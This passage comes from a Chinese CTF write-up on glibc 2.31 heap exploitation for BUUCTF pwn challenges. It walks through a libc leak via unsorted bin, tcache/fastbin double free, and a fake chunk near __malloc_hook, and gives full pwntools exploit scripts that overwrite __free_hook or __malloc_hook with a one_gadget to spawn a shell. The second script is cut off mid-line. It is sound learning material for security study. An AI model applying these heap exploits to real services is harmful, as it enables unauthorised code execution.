chunk 需要大于该值。</p>\n<p>由于能 free 掉的只有 headchunk，即使创建了一个大 chunk 也 free 不掉。因此可以利用任意地址读写，修改某个 headchunk 的头，使其变为一个大 chunk。大小记得与其他 chunk 对齐。然后释放对应 headchunk，再将其 fd 打印，也就是 mainarena+96 的地址。</p>\n<h3 id=\"步骤-2\"><a class=\"markdownIt-Anchor\" href=\"#步骤-2\">#</a> 步骤</h3>\n<p>先分配 4 次块，第三次分配块的大小为 <code>0x420-0x28-0x10</code> ，目的是让修改后的 0x420 大小的 head2 对齐 head3。然后 free 掉前两个 headchunk，构造任意地址读写。这时填充 head1 泄露堆地址。然后去计算 h2 的真实地址。</p>\n<p>这里懒得一个个构造 head1 了，所以写了个 python 类。传入要修改的地址，通过 head0 写入 head1，然后通过 head1 往目标地址读写。第一次操作修改 head2 的头为 0x421，然后释放 head2 泄露 libc 地址。第二次操作修改 free_hook 为 one_gadget。最后执行一次 free 函数 getshell。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29440</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn_pe')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *$rebase(0x1837)')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter size: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'write the note: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcont</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'enter idx(0~15): \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">headchunk</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> dest<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        self<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> dest</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        self<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">out</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>dest<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">return</span> payload</pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x420</span><span class=\"token operator\">-</span><span class=\"token number\">0x28</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#free(1)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x17</span><span class=\"token operator\">+</span><span class=\"token string\">b'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ab'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>r1 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>h0 <span class=\"token operator\">=</span> r1 <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the first chunk is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>h0<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>h2 <span class=\"token operator\">=</span> h0 <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>hc1 <span class=\"token operator\">=</span> headchunk<span class=\"token punctuation\">(</span>h2<span class=\"token operator\">-</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#change h2's size</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hc1<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x421</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>hc1<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> h2</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hc1<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>mainarena_96 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mainarena_96 <span class=\"token operator\">-</span> <span class=\"token number\">0x1ecbe0</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the libcbase is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>libcbase<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">#if offine, libcbase need add 0x30</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token comment\">#onegadget = libcbase + 0xe3b01 + 0x30</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b01</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>freehook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>   </pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the freehook is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>freehook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the one_gadget is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>onegadget<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>hc1<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> freehook</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hc1<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"god-of-change\"><a class=\"markdownIt-Anchor\" href=\"#god-of-change\">#</a> god of change</h2>\n<p>堆 heap,  tcache dup, off-by-one, malloc_hook, one_gadget</p>\n<p>libc: 2.31</p>\n<h3 id=\"程序分析-2\"><a class=\"markdownIt-Anchor\" href=\"#程序分析-2\">#</a> 程序分析</h3>\n<p>程序中功能选择有创建 <code>add()</code> ，释放 <code>delete()</code> ，显示 <code>show()</code> 。(好像是我自己给程序重命名的)</p>\n<h4 id=\"创建函数\"><a class=\"markdownIt-Anchor\" href=\"#创建函数\">#</a> 创建函数</h4>\n<p>存在很明显的故意的单字节溢出，完全就是怕你看不见。<img data-src=\"./image-20231019210519069.png\" alt=\"image-20231019210519069\"></p>\n<p>其次，限制了 malloc 块的大小，最大为 0x7f。最后，加了两个数组，分别储存分配 chunk 的大小和是否在使用，我分别命名为 chunkSize 和 chunkInuse。</p>\n<p>最多分配 31 次 chunk。</p>\n<h4 id=\"释放函数\"><a class=\"markdownIt-Anchor\" href=\"#释放函数\">#</a> 释放函数</h4>\n<p>不检查 chunkInuse，不清除对应 chunkLIst 的指针，可以 double free。</p>\n<p>会将对应的 chunkSize 和 chunkInuse 置 0。</p>\n<h4 id=\"显示函数\"><a class=\"markdownIt-Anchor\" href=\"#显示函数\">#</a> 显示函数</h4>\n<p>会检查 chunkInuse。</p>\n<h3 id=\"漏洞利用-2\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用-2\">#</a> 漏洞利用</h3>\n<p>依旧是构造 unsorted bin 泄露 libc 地址。利用 off-by-one 修改相邻的 chunk 的 size，造成 overlapping。然后伪造大 chunk，释放并泄露地址。</p>\n<p>可以利用 tcache dup 进行任意地址读写。高版本对 tcache 的 double free 的检查很严用不了，所以释放 7 个同大小 chunk 填满 tcache，使之后的 chunk 被放入 fastbin，再利用 fastbin 的 double free。这需要目标地址附近能构造 fake chunk。</p>\n<p>由于 free_hook 附近比我的脑子还空，所以只能利用 malloc_hook，然后覆写为 one_gadget。</p>\n<p><img data-src=\"./image-20231019213451394.png\" alt=\"image-20231019213451394\"></p>\n<h3 id=\"步骤-3\"><a class=\"markdownIt-Anchor\" href=\"#步骤-3\">#</a> 步骤</h3>\n<p>分配一堆 chunk，其中 chunk3-12 用于对齐之后伪造的 unsorted chunk，最后分配个 chunk13，防止 unsort chunk 与 top chunk 合并。</p>\n<h4 id=\"泄露libc地址-2\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址-2\">#</a> 泄露 libc 地址</h4>\n<p>释放 chunk0 后再分配，同时覆写 chunk1 的大小为 0x81。释放 chunk1，再输入大小 0x78 分配到 chunk1，覆写 chunk2 对应的 size 为 0x461。</p>\n<p>释放 chunk2，使其进入 unsorted bin。再次释放并分配 chunk1，填充 <code>'a'</code>  到 chunk2 的内容区。打印 chunk1 得到 mainarena+96 的地址。用 chunkList [16] 读取 chunk1，因为 chunkList [1] 等的 chunkInuse 已被置 0 无法调用显示函数。</p>\n<h4 id=\"构造fake-chunk\"><a class=\"markdownIt-Anchor\" href=\"#构造fake-chunk\">#</a> 构造 fake chunk</h4>\n<p>在 malloc_hook 附近寻找适合的数据。找到个 0x7f 适合构建 fake chunk。</p>\n<p><img data-src=\"./image-20231019214339224.png\" alt=\"image-20231019214339224\"></p>\n<p>黄色为 prev_size，蓝色为 size，红色为需要覆写的地方。因此 fakechunk 的真实地址为 <code>mallochook-0x30-3</code> ，而其填充内容 <code>payload=b'\\0'*(0x20+3) + p64(one_gadget)</code> 。</p>\n<p><img data-src=\"./image-20231019215016659.png\" alt=\"image-20231019215016659\"> 该 fake chunk 释放时会进入 0x70 的 fastbin，所以之前分配了大量 0x70 真实大小的 chunk。释放 7 个 0x70 真实大小的 chunk。之后再释放一个同大小 chunk，并将其 fd 修改为 fake chunk 的地址。这里选择再利用 chunk1 和 chunk2 构造。修改 chunk2 的 size 为 0x71，释放 chunk1 后，再次利用 chunk1 修改其 fd。</p>\n<p>最后分配掉 tcache 里所有 chunk，程序会将 fastbin 内的 chunk 转化为 tcahce 里的 chunk，再次分配，直到分配到 fake chunk 并修改 malloc_hook 的值。</p>\n<h4 id=\"调用one_gadget\"><a class=\"markdownIt-Anchor\" href=\"#调用one_gadget\">#</a> 调用 one_gadget</h4>\n<p>malloc 非 0 值的时候是找不到合适的 one_gadget 的。但是观察到 rdi 的值与 malloc 时输入的 size 值是一致的，于是我尝试了一下 malloc (0)。</p>\n<blockquote>\n<p>在尝试 malloc (0) 这之前我打算修改 free_hook，然后 free 含有 <code>&quot;/bin/sh\\0&quot;</code>  的 chunk。因此试过 unsorted bin attack，unlink。这些都失败了，因为高版本对 unlink 的检查很严格。还打算尝试多次 tcache dup 修改 main_arena 中的 top chunk 的地址，使其指向 free_hook 附近，但是分配的 chunk 就会超过 30 次。最后想尝试 malloc_hook 指向 reaclloc，然后修改 realloc_hook 指向 one_gadget。在调整 malloc_hook 指向的起始位置的时候才发现了 rdi 的值的特点。</p>\n</blockquote>\n<p><img data-src=\"./image-20231019220812375.png\" alt=\"image-20231019220812375\"><img data-src=\"./image-20231019220839000.png\" alt=\"image-20231019220839000\"></p>\n<p><code>malloc(0)</code>  后是如下情况。<img data-src=\"./image-20231019221621145.png\" alt=\"image-20231019221621145\"></p>\n<p>rdx 也变成 0 了，可以用 0xe3b01 的 one_gadget 了。</p>\n<p>最后记得 malloc (0) 手写，毕竟已经收不到 <code>b&quot;the content:&quot;</code>  了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>isremote <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28449</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    isremote <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">#gdb.attach(p, 'b *$rebase(0x1592)')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/glibc-all-in-one/2.31-0ubuntu9.7_amd64/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">#gdb.attach(p, 'b malloc')</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your Choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token 